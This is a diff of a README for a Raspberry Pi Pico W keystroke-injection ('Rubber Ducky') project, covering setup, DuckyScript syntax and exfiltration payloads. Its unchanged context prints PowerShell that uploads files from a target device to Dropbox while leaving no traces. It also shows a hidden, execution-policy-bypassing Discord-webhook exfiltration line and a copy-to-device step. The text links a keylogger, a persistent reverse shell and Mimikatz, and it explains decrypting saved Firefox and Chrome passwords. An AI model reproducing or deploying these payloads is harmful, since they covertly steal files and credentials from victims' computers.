@@ -4,9 +4,9 @@ I recently came across [Hak5's Rubbber Ducky](https://github.com/hak5/usbrubberd
 The basic working of a "Rubber Ducky" boils down to when it is connected to the target device, it behaves as a USB HID such as a keyboard, mouse etc and can therefore execute keystrokes and clicks just like how a human would on a computer without raising any flags making it extremely efficient and stealthy.
 
 ## Table of contents 
-- Configuring the RasPi Pico W
-- Payloads
-- Decrypting
+- [Configuring the RasPi Pico W](#Configuring-the-Raspberry-Pico-W-Ducky)
+- [Payloads](#Payloads)
+- [Decrypting](#Decrypting-Passwords)
 
 ## Configuring the Raspberry Pico W Ducky
 
@@ -89,8 +89,6 @@ REPEAT 10
 // types out "Hello world" 11 times (1 original + 10 repeats)
 ```
 
-For more advanced usage with functions and `WHILE` loops, check out [duckyScript 3 guide](duckyscript3_instructions.md).
-
 ### Special Keys
 
 DuckyScript also supports many special keys:
@@ -118,7 +116,7 @@ can be used on its own to emulate the Windows key or combined with special keys:
 
 `GUI r` opens Run.exe on Windows which can be used to launch applications and open links easily.
 
-These commands should help understand most payload scripts. For more detailed information on DuckyScript visit Hak5's [Official DuckyScript Guide](https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference).
+These commands should help create and understand most payload scripts. For more detailed information on DuckyScript visit Hak5's [Official DuckyScript Guide](https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference).
 
 ## Types of Payloads
 
@@ -164,6 +162,7 @@ To turn your Windows 10/11 device into a SSH Server capable of receiving data vi
   
   Set-Service -Name ssh-agent -StartupType 'Manual'
   ```
+  
 This will run the SSH service until the device is shut down.
 
 - Check if sshd service is running and listening on port TCP/22(default):
@@ -173,15 +172,16 @@ This will run the SSH service until the device is shut down.
   ```
 
 - After ensuring ssh service is running, `scp` command can be used to send files/folders into the device from a remote machine using:
+
   ```
   scp /dir/file1 /dir/file2 remote_username@remote_IP /remote_dir/folder/
   ```
 
 For an in depth explanation of the SSH service and installation/troubleshooting process refer to this [article](https://theitbros.com/ssh-into-windows/).
 
-
 #### Upload via Dropbox API
 - After verifying Internet Connection, files can be uploaded to Dropbox by using the Dropbox API token and including it in the script. This ensures no file traces exists in the target device. Below is a powershell script that uploads a specified file from the device's %temp% folder to Dropbox using its API.
+  
   ```
   $TargetFilePath="/$FileName"
   $SourceFilePath="$env:TMP\$FileName"
@@ -195,6 +195,7 @@ For an in depth explanation of the SSH service and installation/troubleshooting 
   ```
 
 #### Upload to Discord channel via a discord webhook
+
   ```
   STRING powershell -w h -ep bypass $discord='
 
@@ -208,6 +209,7 @@ For an in depth explanation of the SSH service and installation/troubleshooting 
 
 #### Send file to Ducky-Pico Storage
 - Files may also be stored onto the physical HID pico-ducky storage itself by checking the drive letter assigned to it in the target device file system and copying the files into the drive root directory.
+  
   ```
   STRING $destinationLabel = "RPI-RP2"
   ENTER
@@ -220,16 +222,14 @@ For an in depth explanation of the SSH service and installation/troubleshooting 
 Some more interesting payloads
 - [Ducky KeyLogger](https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/credentials/DuckyLogger)
 - [Persistent ReverseShell Ducky](https://github.com/drapl0n/persistentReverseDucky/tree/main)
-
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) is an extremely powerful tool used within some payloads which is capable of extracting Windows user login credentials, hashes, keys, pin codes, tickets from the memory of `LSASS` (Local Security Authority Subsystem Service).
+- [Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) is an extremely powerful tool used within some payloads which is capable of extracting Windows user login credentials, hashes, keys, pin codes, tickets from the memory of `LSASS` (Local Security Authority Subsystem Service).
 
 # Decrypting Passwords
 
-Certain payloads are capable of extracting user credentials from the device storage/memory etc by performing very specific attacks. Often these credentials are extracted in the form of excrypted hashes but it is still possible to decrypt and reveal the plaintext login credentials from them via these python scripts.
+Certain payloads are capable of extracting user credentials from the device storage/memory etc by performing very specific attacks. Often these credentials are extracted in the form of excrypted hashes but it is still possible to decrypt and reveal the plaintext login credentials from them via python scripts for example saved browser credentials.
 
 ## Firefox
-[**Firefox Decrypt**](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates.
+**Firefox Decrypt** is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates.
 
 It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known.
 If a profile is not protected by a Master Password, passwords are displayed without prompt.
@@ -344,19 +344,20 @@ Firefox is a trademark of the Mozilla Foundation in the U.S. and other countries
 ### Further Reading
 I have covered only the minimum information needed to use this tool. 
 
-- Check out the Firefox Decrypt repository from [unode](https://github.com/unode) to learn more about this interesting tool. 
+- Check out the [Firefox Decrypt tool](https://github.com/unode/firefox_decrypt) from [unode](https://github.com/unode) to learn more about this interesting tool. 
 
-- Refer to this Medium article from [ohyicong](https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016) to understand the working behind the decrypting process.
+- Refer to this [Medium](https://medium.com/geekculture/how-to-hack-firefox-passwords-with-python-a394abf18016) article from [ohyicong](https://github.com/ohyicong) to understand the working behind the decrypting process.
 
 ## Chrome
 
 ### Usage
 
 Run:
+
 ```
 python decrypt_chrome_password.py
 ```
 
 ### Working
 
-Refer to this Medium article from [ohyicong](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) to understand how the decrypting process works.
+Refer to this [Medium article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d) from [ohyicong](https://github.com/ohyicong/decrypt-chrome-passwords) to understand how the decrypting process works.
